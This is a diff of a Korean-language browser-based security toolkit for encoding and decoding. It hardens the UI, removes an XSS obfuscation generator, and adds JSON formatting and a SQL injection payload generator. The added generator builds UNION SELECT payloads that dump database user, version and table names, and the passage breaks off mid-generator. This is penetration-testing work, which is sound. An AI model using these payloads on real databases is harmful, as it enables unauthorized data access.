                     </div>
                 </div>
 
@@ -856,7 +1892,7 @@
                     <label for="jwt-output">디코딩 결과</label>
                     <textarea id="jwt-output" placeholder="JWT 토큰 디코딩 결과가 여기에 표시됩니다..." readonly></textarea>
                     <div class="button-group">
-                        <button class="btn btn-secondary" onclick="copyText('jwt-output')">📋 복사</button>
+                        <button class="btn btn-secondary" data-action="copy" data-target="jwt-output">📋 복사</button>
                     </div>
                 </div>
                 <div id="jwt-message" class="message"></div>
@@ -868,8 +1904,8 @@
                     <label for="hash-input">입력 텍스트</label>
                     <textarea id="hash-input" placeholder="해시를 생성할 텍스트를 입력하세요..."></textarea>
                     <div class="button-group">
-                        <button class="btn btn-primary" onclick="generateAllHashes()">🔐 모든 해시 생성</button>
-                        <button class="btn btn-secondary" onclick="clearText('hash-input')">🗑️ 초기화</button>
+                        <button class="btn btn-primary" data-action="generateAllHashes">🔐 모든 해시 생성</button>
+                        <button class="btn btn-secondary" data-onclick="clearText('hash-input')">🗑️ 초기화</button>
                     </div>
                 </div>
 
@@ -877,27 +1913,27 @@
                     <div class="hash-result">
                         <div class="hash-label">MD5</div>
                         <div class="hash-value" id="hash-md5">-</div>
-                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" onclick="copyText('hash-md5')">📋 복사</button>
+                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" data-action="copy" data-target="hash-md5">📋 복사</button>
                     </div>
                     <div class="hash-result">
                         <div class="hash-label">SHA-1</div>
                         <div class="hash-value" id="hash-sha1">-</div>
-                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" onclick="copyText('hash-sha1')">📋 복사</button>
+                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" data-action="copy" data-target="hash-sha1">📋 복사</button>
                     </div>
                     <div class="hash-result">
                         <div class="hash-label">SHA-256</div>
                         <div class="hash-value" id="hash-sha256">-</div>
-                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" onclick="copyText('hash-sha256')">📋 복사</button>
+                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" data-action="copy" data-target="hash-sha256">📋 복사</button>
                     </div>
                     <div class="hash-result">
                         <div class="hash-label">SHA-384</div>
                         <div class="hash-value" id="hash-sha384">-</div>
-                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" onclick="copyText('hash-sha384')">📋 복사</button>
+                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" data-action="copy" data-target="hash-sha384">📋 복사</button>
                     </div>
                     <div class="hash-result">
                         <div class="hash-label">SHA-512</div>
                         <div class="hash-value" id="hash-sha512">-</div>
-                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" onclick="copyText('hash-sha512')">📋 복사</button>
+                        <button class="btn btn-secondary" style="margin-top: 8px; width: 100%;" data-action="copy" data-target="hash-sha512">📋 복사</button>
                     </div>
                 </div>
                 <div id="hash-message" class="message"></div>
@@ -913,8 +1949,8 @@
                     <label for="smart-input">분석할 텍스트</label>
                     <textarea id="smart-input" placeholder="자동 감지할 텍스트를 입력하세요..."></textarea>
                     <div class="button-group">
-                        <button class="btn btn-primary" onclick="smartDetect()">🔍 자동 감지 및 디코딩</button>
-                        <button class="btn btn-secondary" onclick="clearText('smart-input')">🗑️ 초기화</button>
+                        <button class="btn btn-primary" data-action="smartDetect">🔍 자동 감지 및 디코딩</button>
+                        <button class="btn btn-secondary" data-onclick="clearText('smart-input')">🗑️ 초기화</button>
                     </div>
                 </div>
 
@@ -926,7 +1962,43 @@
             </div>
 
             <!-- Presets Tab -->
-            <div class="tab-content" id="presets">
+            
+            <!-- JSON Tab -->
+            <div class="tab-content" id="json">
+                <div class="toggle-container">
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="json-realtime" checked>
+                        <span class="toggle-slider"></span>
+                    </label>
+                    <span class="toggle-label">실시간 변환 활성화</span>
+                </div>
+
+                <div class="dual-panel">
+                    <div class="panel">
+                        <label for="json-input">JSON 입력</label>
+                        <textarea id="json-input" placeholder='{"key": "value"}' style="font-family: 'Consolas', 'Monaco', monospace;"></textarea>
+                        <div class="button-group">
+                            <button class="btn btn-secondary" data-onclick="clearText('json-input')">🗑️ 입력 초기화</button>
+                            <button class="btn btn-secondary" data-action="copy" data-target="json-input">📋 복사</button>
+                        </div>
+                    </div>
+
+                    <div class="middle-actions">
+                        <button class="btn btn-primary" data-onclick="processJson('beautify')">✨ 예쁘게 (Beautify)</button>
+                        <button class="btn btn-primary" data-onclick="processJson('minify')">📦 압축 (Minify)</button>
+                    </div>
+
+                    <div class="panel">
+                        <label for="json-output">결과</label>
+                        <textarea id="json-output" readonly style="font-family: 'Consolas', 'Monaco', monospace; white-space: pre;"></textarea>
+                        <div class="button-group">
+                            <button class="btn btn-secondary" data-action="copy" data-target="json-output">📋 복사</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+<div class="tab-content" id="presets">
                 <div class="info-box">
                     <strong>💾 Preset Payloads:</strong> 자주 사용하는 페이로드를 저장하고 불러올 수 있습니다. 브라우저 로컬 스토리지에 저장됩니다.
                 </div>
@@ -940,9 +2012,9 @@
                         <input type="text" id="preset-name" placeholder="예: SQL Union Select" style="width: 100%; padding: var(--space-12); border: 1px solid var(--color-border); border-radius: var(--radius-base); background: var(--color-background); color: var(--color-text); font-family: var(--font-family-base); margin-bottom: var(--space-12);">
 
                         <label for="preset-category">카테고리</label>
-                        <select id="preset-category" style="width: 100%; margin-bottom: var(--space-12);">
+                        <select id="preset-category" style="width: 100%; padding: var(--space-8); border: 1px solid var(--color-border); border-radius: var(--radius-base); background: var(--color-background); color: var(--color-text); margin-bottom: var(--space-12);">
                             <option value="sqli">SQL Injection</option>
-                            <option value="xss">XSS</option>
+                            
                             <option value="lfi">LFI/Path Traversal</option>
                             <option value="xxe">XXE</option>
                             <option value="ssti">SSTI</option>
@@ -950,16 +2022,16 @@
                         </select>
 
                         <label for="preset-payload">페이로드</label>
-                        <textarea id="preset-payload" placeholder="저장할 페이로드를 입력하세요..." style="min-height: 120px;"></textarea>
+                        <textarea id="preset-payload" placeholder="저장할 페이로드를 입력하세요..." style="width: 100%; min-height: 120px; padding: var(--space-12); border: 1px solid var(--color-border); border-radius: var(--radius-base); background: var(--color-background); color: var(--color-text); font-family: var(--font-family-mono); resize: vertical; margin-bottom: var(--space-12);"></textarea>
 
-                        <button class="btn btn-primary" onclick="savePreset()" style="width: 100%; margin-top: var(--space-12);">💾 페이로드 저장</button>
+                        <button class="btn btn-primary" data-action="savePreset" style="width: 100%; margin-top: var(--space-12);">💾 페이로드 저장</button>
                     </div>
                 </div>
 
                 <div class="preset-section">
                     <div class="preset-header">
                         <span class="preset-title">저장된 페이로드</span>
-                        <button class="btn btn-secondary preset-btn" onclick="loadPresets()">🔄 새로고침</button>
+                        <button class="btn btn-secondary preset-btn" data-action="loadPresets">🔄 새로고침</button>
                     </div>
 
                     <div>
@@ -967,7 +2039,7 @@
                         <select id="preset-filter" onchange="filterPresets()" style="width: 100%; margin-bottom: var(--space-12);">
                             <option value="all">전체</option>
                             <option value="sqli">SQL Injection</option>
-                            <option value="xss">XSS</option>
+                            
                             <option value="lfi">LFI/Path Traversal</option>
                             <option value="xxe">XXE</option>
                             <option value="ssti">SSTI</option>
@@ -986,7 +2058,7 @@
         </div>
     </div>
 
-    <script>
+    <script nonce="JHa5DcRot4GaiOoAgDYYcg">
         // Tab switching
         document.querySelectorAll('.tab').forEach(tab => {
             tab.addEventListener('click', () => {
@@ -1280,7 +2352,7 @@
                 return;
             }
             const textarea = document.createElement('textarea');
-            textarea.innerHTML = input;
+            textarea.textContent = input;
             const decoded = textarea.value;
             document.getElementById('html-output').value = decoded;
             showMessage('html-message', '✓ HTML 디코딩 완료', 'success');
@@ -1389,90 +2461,7 @@
             }
         }
 
-        // XSS Obfuscation functions
-        function obfuscateXSS() {
-            const input = document.getElementById('xss-input').value;
-            const method = document.getElementById('xss-method').value;
-
-            if (!input) {
-                showMessage('xss-message', '입력 텍스트를 입력하세요', 'error');
-                return;
-            }
-
-            let output = '';
-
-            try {
-                switch (method) {
-                    case 'hex':
-                        // \x41\x6c\x65\x72\x74
-                        output = Array.from(input)
-                            .map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'))
-                            .join('');
-                        break;
-
-                    case 'unicode':
-                        // \u0061\u006c\u0065\u0072\u0074
-                        output = Array.from(input)
-                            .map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'))
-                            .join('');
-                        break;
-
-                    case 'octal':
-                        // \141\154\145\162\164
-                        output = Array.from(input)
-                            .map(c => '\\' + c.charCodeAt(0).toString(8))
-                            .join('');
-                        break;
-
-                    case 'char':
-                        // String.fromCharCode(97,108,101,114,116)
-                        const charCodes = Array.from(input)
-                            .map(c => c.charCodeAt(0))
-                            .join(',');
-                        output = `String.fromCharCode(${charCodes})`;
-                        break;
-
-                    case 'html-entity-decimal':
-                        // &#97;&#108;&#101;&#114;&#116;
-                        output = Array.from(input)
-                            .map(c => '&#' + c.charCodeAt(0) + ';')
-                            .join('');
-                        break;
-
-                    case 'html-entity-hex':
-                        // &#x61;&#x6c;&#x65;&#x72;&#x74;
-                        output = Array.from(input)
-                            .map(c => '&#x' + c.charCodeAt(0).toString(16) + ';')
-                            .join('');
-                        break;
-
-                    case 'concat':
-                        // 'al'+'ert'
-                        const chunks = [];
-                        for (let i = 0; i < input.length; i += 2) {
-                            chunks.push("'" + input.substring(i, i + 2) + "'");
-                        }
-                        output = chunks.join('+');
-                        break;
-
-                    case 'eval-base64':
-                        // eval(atob('YWxlcnQ='))
-                        const base64 = btoa(unescape(encodeURIComponent(input)));
-                        output = `eval(atob('${base64}'))`;
-                        break;
-
-                    default:
-                        output = input;
-                }
-
-                document.getElementById('xss-output').value = output;
-                showMessage('xss-message', '✓ XSS 난독화 완료', 'success');
-            } catch (e) {
-                showMessage('xss-message', '난독화 실패: ' + e.message, 'error');
-            }
-        }
-
-        // JWT functions
+        
         function decodeJWT() {
             const input = document.getElementById('jwt-input').value.trim();
             if (!input) {
@@ -1715,128 +2704,307 @@
             return (wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d)).toLowerCase();
         }
 
+        
         // Smart Detection functions
         function smartDetect() {
-            const input = document.getElementById('smart-input').value;
+            const input = document.getElementById('smart-input').value.trim();
             if (!input) {
-                showMessage('smart-message', '분석할 텍스트를 입력하세요', 'error');
+                showMessage('smart-message', '입력값을 입력해주세요.', 'error');
                 return;
             }
 
+            const startTime = performance.now();
             const results = [];
+            const encodingChains = [];
+            const visited = new Set();
 
-            // Test Base64
-            if (isBase64(input)) {
-                try {
-                    const decoded = decodeURIComponent(escape(atob(input)));
-                    results.push({
-                        type: 'Base64',
-                        value: decoded
-                    });
-                } catch (e) {}
+            // ===== HTML 이스케이핑 함수 =====
+            function escapeHtml(text) {
+                if (!text) return '';
+                const map = {
+                    '&': '&amp;',
+                    '<': '&lt;',
+                    '>': '&gt;',
+                    '"': '&quot;',
+                    "'": '&#039;'
+                };
+                return String(text).replace(/[&<>"']/g, m => map[m]);
             }
 
-            // Test URL Encoding
-            if (isURLEncoded(input)) {
-                try {
-                    const decoded = decodeURIComponent(input);
-                    results.push({
-                        type: 'URL Encoding',
-                        value: decoded
-                    });
-                } catch (e) {}
-            }
+            // ===== 정규식 패턴 =====
+            const patterns = {
+                base64: /^[A-Za-z0-9+/=_-]+$/,
+                base32: /^[A-Z2-7=]+$/i,
+                url: /[%+]/,
+                hex: /^[0-9a-fA-F]+$/i,
+                md5: /^[a-f0-9]{32}$/i,
+                sha1: /^[a-f0-9]{40}$/i,
+                sha256: /^[a-f0-9]{64}$/i,
+                sha512: /^[a-f0-9]{128}$/i
+            };
 
-            // Test Double URL Encoding
-            try {
-                const firstDecode = decodeURIComponent(input);
-                const secondDecode = decodeURIComponent(firstDecode);
-                if (secondDecode !== firstDecode && secondDecode !== input) {
-                    results.push({
-                        type: 'Double URL Encoding',
-                        value: secondDecode
-                    });
+            // ===== 디코더 함수들 =====
+            function tryBase64Decode(str) {
+                try {
+                    if (!patterns.base64.test(str) || str.length < 4) return null;
+                    const clean = str.replace(/-/g, '+').replace(/_/g, '/');
+                    const padded = clean + '='.repeat((4 - clean.length % 4) % 4);
+                    const decoded = atob(padded);
+                    return decoded !== str ? decoded : null;
+                } catch { 
+                    return null; 
                 }
-            } catch (e) {}
-
-            // Test HTML Entity
-            if (isHTMLEncoded(input)) {
-                const textarea = document.createElement('textarea');
-                textarea.innerHTML = input;
-                results.push({
-                    type: 'HTML Entity',
-                    value: textarea.value
-                });
             }
 
-            // Test Hex
-            if (isHexEncoded(input)) {
+            function tryURLDecode(str) {
                 try {
-                    const decoded = input.match(/.{1,2}/g)
-                        .map(byte => String.fromCharCode(parseInt(byte, 16)))
-                        .join('');
-                    results.push({
-                        type: 'Hex Encoding',
-                        value: decoded
-                    });
-                } catch (e) {}
+                    if (!patterns.url.test(str)) return null;
+                    const decoded = decodeURIComponent(str.replace(/\+/g, ' '));
+                    return decoded !== str ? decoded : null;
+                } catch { 
+                    return null; 
+                }
             }
 
-            // Test Unicode
-            if (isUnicodeEncoded(input)) {
+            function tryHexDecode(str) {
                 try {
-                    const decoded = input.replace(/\\u([0-9a-fA-F]{4})/g, (match, grp) => {
-                        return String.fromCharCode(parseInt(grp, 16));
-                    });
-                    results.push({
-                        type: 'Unicode Escape',
-                        value: decoded
-                    });
-                } catch (e) {}
+                    if (!patterns.hex.test(str) || str.length % 2 !== 0) return null;
+                    let hex = str.toLowerCase().startsWith('0x') ? str.slice(2) : str;
+                    let result = '';
+                    for (let i = 0; i < hex.length; i += 2) {
+                        result += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+                    }
+                    return result !== str ? result : null;
+                } catch { 
+                    return null; 
+                }
             }
 
-            // Test JWT
-            if (input.split('.').length === 3) {
+            function tryBase32Decode(str) {
                 try {
-                    const parts = input.split('.');
-                    const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
-                    const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
-                    results.push({
-                        type: 'JWT Token',
-                        value: 'Header: ' + JSON.stringify(header, null, 2) + '\n\nPayload: ' + JSON.stringify(payload, null, 2)
-                    });
-                } catch (e) {}
+                    if (!patterns.base32.test(str) || str.length < 8) return null;
+                    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+                    let bits = '';
+                    for (let char of str.toUpperCase().replace(/=/g, '')) {
+                        const val = alphabet.indexOf(char);
+                        if (val === -1) return null;
+                        bits += val.toString(2).padStart(5, '0');
+                    }
+                    let result = '';
+                    for (let i = 0; i + 8 <= bits.length; i += 8) {
+                        result += String.fromCharCode(parseInt(bits.substr(i, 8), 2));
+                    }
+                    return result && result !== str ? result : null;
+                } catch { 
+                    return null; 
+                }
             }
 
-                // Display results
-            if (results.length === 0) {
-                showMessage('smart-message', '감지된 인코딩 방식이 없습니다.', 'warning');
-                document.getElementById('smart-results').style.display = 'none';
-            } else {
-                const container = document.getElementById('smart-results-content');
-                container.innerHTML = ''; // 기존 내용 초기화
-                
-                results.forEach(result => {
-                    const detectionItem = document.createElement('div');
-                    detectionItem.className = 'detection-item';
-                    
-                    const detectionType = document.createElement('div');
-                    detectionType.className = 'detection-type';
-                    detectionType.textContent = result.type; // textContent 사용
-                    
-                    const detectionValue = document.createElement('div');
-                    detectionValue.className = 'detection-value';
-                    detectionValue.textContent = result.value; // textContent 사용 (XSS 방지)
-                    
-                    detectionItem.appendChild(detectionType);
-                    detectionItem.appendChild(detectionValue);
-                    container.appendChild(detectionItem);
-                });
-                
-                document.getElementById('smart-results').style.display = 'block';
-                showMessage('smart-message', `✓ ${results.length}개의 인코딩 방식 감지`, 'success');
+            // ===== 인코딩 체인 감지 =====
+            const maxDepth = input.length > 5000 ? 2 : 4;
+
+            function detectChainOptimized(value, chain = [], depth = 0) {
+                if (depth >= maxDepth || !value || visited.has(value)) return;
+                visited.add(value);
+
+                const decoders = [
+                    { name: 'URL Encoding', func: tryURLDecode },
+                    { name: 'Base64', func: tryBase64Decode },
+                    { name: 'Base32', func: tryBase32Decode },
+                    { name: 'Hex', func: tryHexDecode }
+                ];
+
+                for (const decoder of decoders) {
+                    const decoded = decoder.func(value);
+                    if (decoded && decoded !== value) {
+                        const newChain = [...chain, { 
+                            encoding: decoder.name,
+                            value: value.length > 200 ? value.substring(0, 200) + '...' : value,
+                            decoded: decoded.length > 200 ? decoded.substring(0, 200) + '...' : decoded
+                        }];
+
+                        encodingChains.push({
+                            chain: newChain,
+                            finalValue: decoded,
+                            depth: newChain.length,
+                            confidence: Math.max(50, 100 - (newChain.length * 12))
+                        });
+
+                        if (depth + 1 < maxDepth) {
+                            detectChainOptimized(decoded, newChain, depth + 1);
+                        }
+                    }
+                }
             }
+
+            // 체인 감지 실행
+            detectChainOptimized(input);
+
+            // ===== 단일 레이어 검사 =====
+            const addResult = (type, value, confidence = 100) => {
+                if (value && value !== input && !visited.has(value)) {
+                    results.push({ type, value, confidence });
+                    visited.add(value);
+                }
+            };
+
+            if (patterns.url.test(input)) {
+                const decoded = tryURLDecode(input);
+                if (decoded) addResult('URL Encoding', decoded, 95);
+            }
+
+            if (patterns.base64.test(input) && input.length >= 4) {
+                const decoded = tryBase64Decode(input);
+                if (decoded) addResult('Base64', decoded, 90);
+            }
+
+            if (patterns.hex.test(input)) {
+                const decoded = tryHexDecode(input);
+                if (decoded) addResult('Hex Encoding', decoded, 85);
+            }
+
+            if (patterns.base32.test(input)) {
+                const decoded = tryBase32Decode(input);
+                if (decoded) addResult('Base32', decoded, 80);
+            }
+
+            // 해시 형식 감지
+            if (patterns.md5.test(input)) {
+                addResult('Hash (MD5)', '[해시값 - 복호화 불가능]', 100);
+            } else if (patterns.sha1.test(input)) {
+                addResult('Hash (SHA-1)', '[해시값 - 복호화 불가능]', 100);
+            } else if (patterns.sha256.test(input)) {
+                addResult('Hash (SHA-256)', '[해시값 - 복호화 불가능]', 100);
+            } else if (patterns.sha512.test(input)) {
+                addResult('Hash (SHA-512)', '[해시값 - 복호화 불가능]', 100);
+            }
+
+            // ===== 결과 렌더링 (DOM API 사용 - XSS 방어) =====
+            const resultsContainer = document.getElementById('smart-results-content');
+            resultsContainer.textContent = '';
+
+            // 체인 결과 렌더링
+            if (encodingChains.length > 0) {
+                const chainDiv = document.createElement('div');
+
+                encodingChains
+                    .sort((a, b) => b.confidence - a.confidence)
+                    .slice(0, 10)
+                    .forEach((chain, idx) => {
+                        const itemDiv = document.createElement('div');
+                        itemDiv.className = 'detection-result-item';
+                        itemDiv.style.cssText = 'margin-bottom: 20px; border-left: 4px solid var(--color-primary); padding: 12px; background: rgba(33, 128, 141, 0.05); border-radius: 4px;';
+
+                        // 헤더
+                        const headerDiv = document.createElement('div');
+                        headerDiv.style.cssText = 'display: flex; justify-content: space-between; margin-bottom: 8px;';
+
+                        const pathTitle = document.createElement('strong');
+                        pathTitle.textContent = '경로 ' + (idx + 1);
+                        pathTitle.style.color = 'var(--color-text)';
+                        headerDiv.appendChild(pathTitle);
+
+                        const confidence = document.createElement('span');
+                        confidence.textContent = '확신도: ' + chain.confidence + '%';
+                        confidence.style.cssText = 'color: var(--color-green-500); font-weight: bold;';
+                        headerDiv.appendChild(confidence);
+                        itemDiv.appendChild(headerDiv);
+
+                        // 인코딩 체인 단계
+                        const chainSteps = document.createElement('div');
+                        chainSteps.style.margin = '8px 0';
+
+                        chain.chain.forEach((step, i) => {
+                            const stepDiv = document.createElement('div');
+                            stepDiv.style.cssText = 'margin: 4px 0; font-size: 0.9em; color: var(--color-text-secondary);';
+
+                            const stepNum = document.createTextNode((i + 1) + '. ');
+                            stepDiv.appendChild(stepNum);
+
+                            const stepName = document.createElement('strong');
+                            stepName.textContent = step.encoding;
+                            stepDiv.appendChild(stepName);
+
+                            chainSteps.appendChild(stepDiv);
+                        });
+                        itemDiv.appendChild(chainSteps);
+
+                        // 최종 결과
+                        const resultDiv = document.createElement('div');
+                        resultDiv.style.cssText = 'background: var(--color-charcoal-800); color: var(--color-cream-50); padding: 8px; border-radius: 4px; word-break: break-all; font-family: monospace; font-size: 0.85em; max-height: 100px; overflow-y: auto;';
+
+                        const resultLabel = document.createElement('strong');
+                        resultLabel.textContent = '결과: ';
+                        resultDiv.appendChild(resultLabel);
+
+                        const resultCode = document.createElement('code');
+                        resultCode.textContent = chain.finalValue.substring(0, 500);
+                        resultCode.style.cssText = 'color: var(--color-cream-50); word-break: break-all; white-space: pre-wrap;';
+                        resultDiv.appendChild(resultCode);
+
+                        itemDiv.appendChild(resultDiv);
+                        chainDiv.appendChild(itemDiv);
+                    });
+
+                resultsContainer.appendChild(chainDiv);
+            }
+
+            // 단일 결과 렌더링
+            if (results.length > 0) {
+                const resultDiv = document.createElement('div');
+
+                results
+                    .sort((a, b) => b.confidence - a.confidence)
+                    .forEach((res, idx) => {
+                        const itemDiv = document.createElement('div');
+                        itemDiv.className = 'detection-result-item';
+                        itemDiv.style.cssText = 'margin-bottom: 15px; padding: 12px; border: 1px solid var(--color-gray-300); border-radius: 4px; background: var(--color-gray-200);';
+
+                        // 헤더
+                        const headerDiv = document.createElement('div');
+                        headerDiv.style.cssText = 'display: flex; justify-content: space-between;';
+
+                        const typeEl = document.createElement('strong');
+                        typeEl.textContent = res.type;
+                        typeEl.style.color = 'var(--color-charcoal-700)';
+                        headerDiv.appendChild(typeEl);
+
+                        const confidenceEl = document.createElement('span');
+                        confidenceEl.textContent = '확신도: ' + res.confidence + '%';
+                        confidenceEl.style.cssText = 'color: var(--color-orange-500); font-size: 0.9em;';
+                        headerDiv.appendChild(confidenceEl);
+                        itemDiv.appendChild(headerDiv);
+
+                        // 결과값
+                        const valueDiv = document.createElement('div');
+                        valueDiv.style.cssText = 'background: var(--color-charcoal-800); color: var(--color-cream-50); padding: 8px; margin-top: 8px; border-radius: 4px; word-break: break-all; font-family: monospace; font-size: 0.85em; max-height: 80px; overflow-y: auto;';
+
+                        const valueCode = document.createElement('code');
+                        valueCode.textContent = res.value.substring(0, 300);
+                        valueCode.style.cssText = 'color: var(--color-cream-50); word-break: break-all; white-space: pre-wrap;';
+                        valueDiv.appendChild(valueCode);
+
+                        itemDiv.appendChild(valueDiv);
+                        resultDiv.appendChild(itemDiv);
+                    });
+
+                resultsContainer.appendChild(resultDiv);
+            }
+
+            // 빈 결과 처리
+            if (resultsContainer.children.length === 0) {
+                const emptyDiv = document.createElement('div');
+                emptyDiv.textContent = '감지된 인코딩이 없습니다.';
+                emptyDiv.style.cssText = 'color: var(--color-text-secondary); font-style: italic; padding: 20px; text-align: center;';
+                resultsContainer.appendChild(emptyDiv);
+            }
+
+            document.getElementById('smart-results').style.display = 'block';
+
+            const endTime = performance.now();
+            console.log(`⚡ Smart Detect 실행: ${(endTime - startTime).toFixed(2)}ms, 결과: ${encodingChains.length + results.length}개`);
         }
+
 
         // Preset Payloads functions
         function savePreset() {
@@ -1849,7 +3017,6 @@
                 return;
             }
 
-            // 이름 길이 제한 (선택사항)
             if (name.length > 100) {
                 showMessage('presets-message', '이름은 100자 이하로 입력하세요', 'error');
                 return;
@@ -1859,13 +3026,15 @@
             let presets = JSON.parse(localStorage.getItem('securityPresets') || '[]');
 
             // Add new preset
-            presets.push({
+            const newPreset = {
                 id: Date.now(),
-                name: name,  // 사용자 입력이지만 textContent로만 출력하므로 안전
+                name: name,
                 category: category,
                 payload: payload,
                 timestamp: new Date().toISOString()
-            });
+            };
+
+            presets.push(newPreset);
 
             // Save to localStorage
             localStorage.setItem('securityPresets', JSON.stringify(presets));
@@ -1897,7 +3066,6 @@
             filteredPresets.forEach(preset => {
                 const categoryLabels = {
                     'sqli': 'SQL Injection',
-                    'xss': 'XSS',
                     'lfi': 'LFI/Path Traversal',
                     'xxe': 'XXE',
                     'ssti': 'SSTI',
@@ -1972,7 +3140,7 @@
                 title.style.marginBottom = 'var(--space-16)';
                 
                 const category = document.createElement('p');
-                category.textContent = '카테고리: ' + ({'sqli': 'SQL Injection', 'xss': 'XSS', 'lfi': 'LFI/Path Traversal', 'xxe': 'XXE', 'ssti': 'SSTI', 'other': '기타'}[preset.category] || preset.category);
+                category.textContent = '카테고리: ' + ({'sqli': 'SQL Injection', 'lfi': 'LFI/Path Traversal', 'xxe': 'XXE', 'ssti': 'SSTI', 'other': '기타'}[preset.category] || preset.category);
                 category.style.marginBottom = 'var(--space-12)';
                 category.style.color = 'var(--color-text-secondary)';
                 
@@ -2039,6 +3207,517 @@
         window.addEventListener('load', () => {
             loadPresets();
         });
+
+            // ==========================================
+            // [추가 기능 1] JSON 자동 정렬 유틸리티
+            // ==========================================
+            function tryFormatJSON(str) {
+                if (!str || typeof str !== 'string') return str;
+                try {
+                    // 숫자로만 된 문자열 등은 JSON으로 치지 않음 (간단한 예외처리)
+                    if (!str.trim().startsWith('{') && !str.trim().startsWith('[')) return str;
+
+                    const parsed = JSON.parse(str);
+                    // 객체나 배열인 경우에만 정렬
+                    if (typeof parsed === 'object' && parsed !== null) {
+                        console.log("JSON format detected, auto-aligning...");
+                        return JSON.stringify(parsed, null, 4); // 4칸 들여쓰기
+                    }
+                } catch (e) {
+                    // JSON이 아니면 원본 그대로 반환
+                }
+                return str;
+            }
+
+            // ==========================================
+            // [기능 수정] 기존 디코딩 함수에 JSON 자동 정렬 적용 (덮어쓰기)
+            // ==========================================
+            
+            // 1. Base64 디코딩 수정
+            const originalDecodeBase64 = window.decodeBase64 || decodeBase64; // 기존 함수 참조 보호
+            window.decodeBase64 = function() {
+                const input = document.getElementById('base64-input').value;
+                const outputEl = document.getElementById('base64-output');
+                const msgEl = document.getElementById('base64-message');
+                
+                if (!input) {
+                    outputEl.value = '';
+                    hideMessage('base64-message');
+                    return;
+                }
+
+                try {
+                    let decoded = atob(input);
+                    // 한글 깨짐 방지
+                    try {
+                        decoded = decodeURIComponent(escape(decoded));
+                    } catch (e) { /* ignore */ }
+
+                    // --> JSON 자동 정렬 적용 <--
+                    outputEl.value = tryFormatJSON(decoded);
+                    
+                    showMessage('base64-message', '성공적으로 디코딩되었습니다.', 'success');
+                } catch (e) {
+                    showMessage('base64-message', '유효하지 않은 Base64 문자열입니다.', 'error');
+                }
+            };
+
+            // 2. URL 디코딩 수정
+            window.decodeURL = function() {
+                const input = document.getElementById('url-input').value;
+                try {
+                    const decoded = decodeURIComponent(input);
+                    document.getElementById('url-output').value = tryFormatJSON(decoded); // JSON 정렬 적용
+                    showMessage('url-message', '성공적으로 디코딩되었습니다.', 'success');
+                } catch (e) {
+                    showMessage('url-message', '디코딩 실패: ' + e.message, 'error');
+                }
+            };
+
+            // 3. Hex 디코딩 수정
+            window.decodeHex = function() {
+                const input = document.getElementById('hex-input').value.replace(/\s/g, '');
+                try {
+                    let str = '';
+                    for (let i = 0; i < input.length; i += 2) {
+                        str += String.fromCharCode(parseInt(input.substr(i, 2), 16));
+                    }
+                    // 한글 처리 시도
+                    try { str = decodeURIComponent(escape(str)); } catch(e) {}
+                    
+                    document.getElementById('hex-output').value = tryFormatJSON(str); // JSON 정렬 적용
+                    showMessage('hex-message', '성공적으로 디코딩되었습니다.', 'success');
+                } catch (e) {
+                    showMessage('hex-message', '유효하지 않은 Hex 문자열입니다.', 'error');
+                }
+            };
+
+            // 4. Unicode 디코딩 수정 (기존 로직 유지 + JSON)
+            window.decodeUnicode = function() {
+                const input = document.getElementById('unicode-input').value;
+                try {
+                    const decoded = input.replace(/\\u[\dA-F]{4}/gi, 
+                        function (match) { return String.fromCharCode(parseInt(match.replace(/\\u/g, ''), 16)); });
+                    document.getElementById('unicode-output').value = tryFormatJSON(decoded); // JSON 정렬 적용
+                    showMessage('unicode-message', '성공적으로 디코딩되었습니다.', 'success');
+                } catch (e) {
+                    showMessage('unicode-message', '디코딩 실패', 'error');
+                }
+            };
+
+
+            // ==========================================
+            // [추가 기능 2] XSS 스캐너 로직 (Research Purpose)
+            // ==========================================
+        function generateSQLi() {
+            const dbms = document.getElementById('sqli-dbms').value;
+            const type = document.getElementById('sqli-type').value;
+            const columns = parseInt(document.getElementById('sqli-columns').value);
+                        const output = document.getElementById('sqli-output');
+            const result = document.getElementById('sqli-result');
+
+            let payloads = [];
+
+            const comments = {
+                mysql: ['-- ', '#', '/**/'],
+                mssql: ['-- ', '/**/'],
+                oracle: ['-- ', '/**/'],
+                postgresql: ['-- ', '/**/'],
+                sqlite: ['-- ', '/**/']
+            };
+
+            const comment = comments[dbms][0];
+            const inlineComment = comments[dbms][2] || '/**/';
+
+            
+
+            const nulls = Array(columns).fill('NULL').join(',');
+
+            if (type === 'union') {
+                switch(dbms) {
+                    case 'mysql':
+                        payloads.push(`' UNION SELECT ${nulls} ${comment}`);
+                        payloads.push(`' UNION SELECT user(),database(),version()${',NULL'.repeat(Math.max(0,columns-3))} ${comment}`);
+                        payloads.push(`' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database() ${comment}`);
+                        break;
+                    case 'mssql':
+                        payloads.push(`' UNION SELECT ${nulls} ${comment}`);
+                        payloads.push(`' UNION SELECT SYSTEM_USER,DB_NAME(),@@VERSION${',NULL'.repeat(Math.max(0,columns-3))} ${comment}`);
+                        break;
+                    case 'oracle':
+                        payloads.push(`' UNION SELECT ${nulls} FROM dual ${comment}`);
+                        payloads.push(`' UNION SELECT USER,banner,NULL FROM v$version ${comment}`);
+                        break;
+                    case 'postgresql':
+                        payloads.push(`' UNION SELECT ${nulls} ${comment}`);
+                        payloads.push(`' UNION SELECT current_user,current_database(),version()${',NULL'.repeat(Math.max(0,columns-3))} ${comment}`);
+                        break;
+                    case 'sqlite':
